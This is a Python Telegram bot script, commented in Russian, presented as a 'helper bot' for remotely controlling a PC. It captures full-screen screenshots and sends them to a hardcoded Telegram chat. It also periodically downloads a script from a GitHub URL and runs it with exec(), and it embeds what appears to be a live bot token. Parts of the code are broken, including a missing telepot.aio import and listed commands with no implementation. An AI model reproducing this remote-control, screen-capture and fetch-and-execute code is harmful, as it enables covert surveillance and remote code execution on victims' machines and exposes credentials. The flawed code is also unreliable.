import asyncio
import telepot
import os
import logging
import requests
import datetime
from PIL import ImageGrab

TOKEN = '8299476991:AAEBqKtv2LNyffb8COD7pa3_4q1jlOcXY6s'
CHAT_ID = '1678221039'
CHECK_INTERVAL = 3600
GITHUB_URL = "https://raw.githubusercontent.com/ваш_пользователь/ваш_репозиторий/main/monitoroff.py"

logging.basicConfig(
    filename='monitor.log', 
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def send_msg(message):
    try:
        telepot.Bot(TOKEN).sendMessage(CHAT_ID, message)
    except Exception as e:
        logging.error(f"Ошибка отправки: {e}")

async def check_monitor():
    while True:
        try:
            if not is_process_running('monitor.py'):
                await run_github_script()
            await asyncio.sleep(CHECK_INTERVAL)
        except Exception as e:
            logging.error(f"Ошибка проверки: {e}")

def is_process_running(process_name):
    try:
        return process_name in os.popen('tasklist').read()
    except Exception as e:
        logging.error(f"Ошибка проверки процесса: {e}")
        return False

async def run_github_script():
    try:
        response = requests.get(GITHUB_URL)
        exec(response.text)
    except Exception as e:
        logging.error(f"Ошибка выполнения скрипта: {e}")

def handle_commands(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    if content_type == 'text' and str(chat_id) == CHAT_ID:
        command = msg['text'].strip().lower()
        
        if command == 'скриншот':
            send_screenshot()
            
        elif command == 'о боте':
            send_msg("""🤖 **Привет! Я — бот-помощник**

Я могу:
• Управлять ПК
• Делать скриншоты
• Мониторить систему
• Запускать программы

Для помощи напиши 'помощь'""")
            
        elif command == 'помощь':
            send_msg("""🔍 **Доступные команды:**

**Управление:**
• скриншот - сделать снимок
• перезагрузить - перезапуск
• выключить - выключение
• пк - статус системы

**Информация:**
• о боте - о мне
• помощь - список команд""")

def send_screenshot():
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot = ImageGrab.grab()
        screenshot.save(f"screenshot_{timestamp}.png")
        with open(f"screenshot_{timestamp}.png", 'rb') as f:
            telepot.Bot(TOKEN).sendPhoto(CHAT_ID, f)
        os.remove(f"screenshot_{timestamp}.png")
    except Exception as e:
        logging.error(f"Ошибка скриншота: {e}")

async def main():
    bot = telepot.aio.Bot(TOKEN)
    await bot.message_loop(handle_commands)
    await asyncio.gather(
        check_monitor(),
        bot.message_loop()
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        logging.critical(f"Критическая ошибка: {e}")